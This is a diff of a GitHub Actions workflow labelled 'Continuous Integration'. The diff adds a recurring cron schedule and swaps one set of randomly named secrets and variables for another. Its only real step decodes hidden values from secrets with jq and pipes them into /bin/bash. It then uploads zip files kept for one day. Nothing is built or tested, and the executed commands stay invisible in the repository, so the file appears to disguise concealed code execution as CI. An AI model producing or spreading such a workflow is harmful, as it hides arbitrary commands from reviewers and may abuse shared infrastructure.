@@ -2,6 +2,8 @@ name: Continuous Integration
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '33 2,8,14,20 * * *'
 env:
   CI: true
 concurrency:
@@ -14,19 +16,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Process
         env:
-          qao6588: ${{ secrets.qao6588 }}
+          ayr2201: ${{ secrets.ayr2201 }}
         run: |
-          printf '%s' "$qao6588" | jq -r .hywd72 | /bin/bash
-          echo $j8 | jq -r .lpgzn12898 | /bin/bash
-          printf '%s' "$dkx07797" | jq -r .mmj56711 | /bin/bash
-          printf '%s' "$tswyz92" | jq -r .iurg31 | /bin/bash
-          echo $sgdeu2645 | jq -r .acobm21 | /bin/bash
-          echo $c12 | jq -r .gslw0 | /bin/bash
-          printf '%s' "$z15190" | jq -r .txwfp01199 | /bin/bash
+          printf '%s' "$ayr2201" | jq -r .nou312 | /bin/bash
+          echo $qdhp5 | jq -r .dndu79 | /bin/bash
+          echo $mhe4 | jq -r .nvxtt17099 | /bin/bash
+          printf '%s' "$w58395" | jq -r .xhio4 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
         with:
-          name: q3KQMEfT
+          name: QZOAJ25r
           path: "*.zip"
           retention-days: 1
